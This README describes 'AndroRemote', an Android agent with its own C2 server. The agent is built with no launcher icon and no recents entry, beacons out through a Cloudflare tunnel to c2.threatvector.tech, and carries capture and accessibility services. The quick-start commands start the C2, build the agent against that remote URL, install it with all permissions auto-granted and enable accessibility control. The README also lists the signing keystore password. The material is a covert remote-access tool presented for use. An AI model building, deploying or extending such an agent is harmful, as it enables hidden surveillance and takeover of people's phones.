# AndroRemote

Headless Android 15 remote-management agent + C2 server. APK has **no GUI**: no launcher icon, no recents entry — everything driven from a terminal.

Two channels, both always active when configured:

1. **adb-direct** — `androremote.py` over `adb forward` (`tcp:8741 → tcp:8740`). Works when USB/adb attached. Raw binary transport.
2. **C2 over internet** — agent beacons *out* through a stable Cloudflare tunnel to `c2.py`. No port forwarding; works on NAT/telephony networks. Base64 transport, AES-256-GCM encrypted.

Stable C2 endpoint: `https://c2.threatvector.tech` (named Cloudflare tunnel, survives C2 restarts — installed APKs reconnect automatically).

## Repo layout

| Path | What |
|---|---|
| `GUIDE.md` | full documentation — setup, build, ops, protocol |
| `androremote.py` | adb-direct CLI |
| `c2.py` | C2 server + cloudflared supervision + operator REPL |
| `build.sh` | APK build (optional C2 URL argument) |
| `app/src/main/` | Android agent: `RemoteService`, `C2Beacon`, capture/accessibility services, receivers |
| `libs/` | OkHttp + Okio jars (auto-downloaded by build.sh) |
| `keystore/release.keystore` | APK signing key (storepass `androremote`) |
| `tools/mock_agent.py` | device-less C2 test client |

## Quick start

```sh
# server (stable tunnel auto-starts: https://c2.threatvector.tech)
python3 c2.py

# build agent APK against the stable C2 URL
./build.sh https://c2.threatvector.tech

# install + provision (USB)
adb install -r -g build/apk/androremote.apk
adb shell am start-foreground-service -n com.ohmpi.androremote/.RemoteService
python3 androremote.py axenable
```

Within ~15s the phone appears in `c2.py` (`sessions`), then `use <id>` and drive it.

**Everything else — full capability table, protocol, tunnel setup, provisioning, remote-control/update details — lives in [`GUIDE.md`](GUIDE.md).**
